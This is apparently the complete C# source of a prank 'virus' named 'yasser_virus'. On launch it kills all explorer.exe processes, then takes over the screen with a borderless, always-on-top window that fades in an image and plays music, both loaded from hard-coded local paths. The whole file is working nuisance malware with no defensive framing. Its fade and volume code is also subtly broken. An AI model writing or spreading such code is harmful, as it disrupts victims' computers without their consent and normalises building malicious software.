using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Media;
using System.Windows.Forms;
using System.Threading;

namespace yasser_virus {
    
    public class Program : Form {
        
        private PictureBox pictureBox;
        private Timer fadeInTimer;
        private float opacity = 0;
        private System.Media.SoundPlayer player;
        private float musicVolume = 0;

        [STAThread]
        public static void Main() {
            
            foreach (var process in Process.GetProcessesByName("explorer")) {
                
                process.Kill();
            }
            Application.Run(new Program());
        }

        public Program() {
            
            this.WindowState = FormWindowState.Maximized;
            this.FormBorderStyle = FormBorderStyle.None;
            this.BackColor = Color.Black;
            this.TopMost = true;

            pictureBox = new PictureBox {
                
                Image = Image.FromFile(@"C:\Users\Nikolay\Downloads\Save_webP\channels4_profile_jpg(1).png"),
                Size = new Size(960, 960),
                Location = new Point((Screen.PrimaryScreen.Bounds.Width - 960) / 2,
                                     (Screen.PrimaryScreen.Bounds.Height - 960) / 2),
                SizeMode = PictureBoxSizeMode.StretchImage,
                Visible = false
            };
            this.Controls.Add(pictureBox);

            fadeInTimer = new Timer {
                
                Interval = 50
            };
            fadeInTimer.Tick += FadeInTimer_Tick;

            player = new System.Media.SoundPlayer(@"C:\Users\Nikolay\Documents\yasser virus\spotifydown.com - Montagem Lunar Diamante - Slowed - DJ DYLANFK (mp3cut.net).wav");

            new Thread(() => {
                
                Thread.Sleep(1000);
                this.Invoke((Action)(() => {
                    
                    pictureBox.Visible = true;
                    fadeInTimer.Start();
                    new Thread(PlayMusic).Start();
                }));
            }).Start();
        }

        private void FadeInTimer_Tick(object sender, EventArgs e) {
            
            if (opacity < 1.0f) {
                
                opacity += 0.05f;
                pictureBox.Image = SetImageOpacity(pictureBox.Image, opacity);
            }
            else {
                
                fadeInTimer.Stop();
            }
        }

        private Image SetImageOpacity(Image image, float opacity) {
            
            Bitmap bmp = new Bitmap(image.Width, image.Height);
            using (Graphics gfx = Graphics.FromImage(bmp)) {
                
                ColorMatrix matrix = new ColorMatrix {
                    
                    Matrix33 = opacity
                };

                ImageAttributes attributes = new ImageAttributes();
                attributes.SetColorMatrix(matrix, ColorMatrixFlag.Default, ColorAdjustType.Bitmap);

                gfx.DrawImage(image, new Rectangle(0, 0, bmp.Width, bmp.Height),
                              0, 0, image.Width, image.Height, GraphicsUnit.Pixel, attributes);
            }

            return bmp;
        }

        private void PlayMusic() {
            
            player.Play();
            while (musicVolume < 1.0f) {
                
                musicVolume += 0.05f;
                Thread.Sleep(100);
            }
        }
    }
}
